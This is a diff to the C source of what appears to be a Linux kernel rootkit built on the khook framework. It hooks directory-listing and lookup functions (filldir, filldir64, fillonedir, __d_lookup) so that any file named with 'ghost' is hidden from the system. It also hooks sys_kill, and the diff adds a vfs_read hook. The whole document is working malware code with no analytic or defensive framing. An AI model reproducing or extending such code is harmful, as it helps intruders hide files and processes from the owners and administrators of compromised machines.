@@ -16,7 +16,7 @@
 #include <asm/unistd.h>
 #include <linux/types.h>
 #include <linux/dirent.h>
-#include <linux/compiler_types.h>
+
 
 
 
@@ -135,7 +135,7 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 {
 	int ret = 0;
 	
-	if (!strstr(name, "ghost") || !strstr(name,protected))
+	if (!strstr(name, "ghost") )
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -143,8 +143,11 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
+
 	int ret = 0;
-	if (!strstr(name, "ghost")|| !strstr(name,protected))
+	find_pid();
+	
+	if (!strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -154,7 +157,7 @@ static int khook_filldir64(void *__buf, const char *name, int namlen,
 			   loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	if (!strstr(name, "ghost")|| !strstr(name,protected))
+	if (!strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -164,7 +167,7 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 				   loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	if (!strstr(name, "ghost")|| !strstr(name,protected))
+	if (!strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -175,7 +178,7 @@ static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 				  loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	if (!strstr(name, "ghost")|| !strstr(name,protected))
+	if (!strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -190,7 +193,7 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 #endif
 {
 	struct dentry *found = NULL;
-	if (!strstr(name->name, "ghost")|| !strstr(name->name,protected))
+	if (!strstr(name->name, "ghost"))
 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
 	return found;
 }
@@ -207,12 +210,12 @@ static long khook_sys_kill(pid_t pid, int sig) {
 	return ret;
 }
 
-// KHOOK_EXT(ssize_t, vfs_write, struct file *, char __user *, size_t, loff_t *);
-// static ssize_t khook_vfs_write(struct file *file, char __user *buf, size_t count, loff_t *pos){
-// 	ssize_t ret;
-// 	ret = KHOOK_ORIGIN(vfs_write, file, buf, count, pos);
-// 	return ret;
-// }
+KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
+static ssize_t khook_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos){
+	ssize_t ret;
+	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);
+	return ret;
+}
 
 
 
